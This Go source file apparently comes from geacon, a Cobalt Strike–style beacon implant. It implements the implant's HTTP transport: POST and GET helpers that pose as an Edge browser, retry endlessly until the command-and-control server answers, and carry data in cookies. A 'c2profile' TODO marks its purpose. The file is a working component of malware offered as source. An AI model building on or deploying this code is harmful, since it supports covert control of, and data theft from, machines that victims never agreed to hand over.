package packet

import (
	"bytes"
	"fmt"
	"geacon/cmd/config"
	"net/http"
	"time"
)

var (
	client *http.Client
)

func init() {
	tr := &http.Transport{
		MaxIdleConns:        20,
		TLSHandshakeTimeout: (config.TimeOut * time.Second),
		DisableKeepAlives:   true,
		// TLSClientConfig: &tls.Config{InsecureSkipVerify: config.VerifySSLCert},
	}
	client = &http.Client{Transport: tr}
}

//TODO c2profile
func HttpPost(url string, data []byte) *http.Response {
	for {
		request, err := http.NewRequest(http.MethodPost, url, bytes.NewBuffer(data))
		request.Header = http.Header{
			"User-Agent":    {"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10136"},
			"Accept":        {"*/*"},
			"Cache-Control": {"no-cache"},
			"Connection":    {"Keep-Alive"},
			"Pragma":        {"no-cache"},
		}
		fmt.Println(request)
		resp, err := client.Do(request)
		if err != nil {
			fmt.Printf("!error: %v\n", err)
			time.Sleep(config.WaitTime)
			continue
		} else {
			if resp.StatusCode == http.StatusOK {
				//close socket
				return resp
			}
			break
		}
	}

	return nil
}

func HttpGet(url string, cookies string) *http.Response {
	// _ = HttpGet(url, cookies)
	for {
		request, err := http.NewRequest(http.MethodGet, url, nil)
		request.Header = http.Header{
			"User-Agent":    {"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10136"},
			"Accept":        {"*/*"},
			"Cache-Control": {"no-cache"},
			"Connection":    {"Keep-Alive"},
			"Pragma":        {"no-cache"},
			"Cookie":        {cookies},
		}
		fmt.Printf("%s\n\n", request)
		resp, err := client.Do(request)
		if err != nil {
			fmt.Printf("!error: %v\n", err)
			time.Sleep(config.WaitTime)
			continue
			//panic(err)
		} else {
			if resp.StatusCode == http.StatusOK {
				//close socket
				return resp
			}
			break
		}
	}
	return nil
}
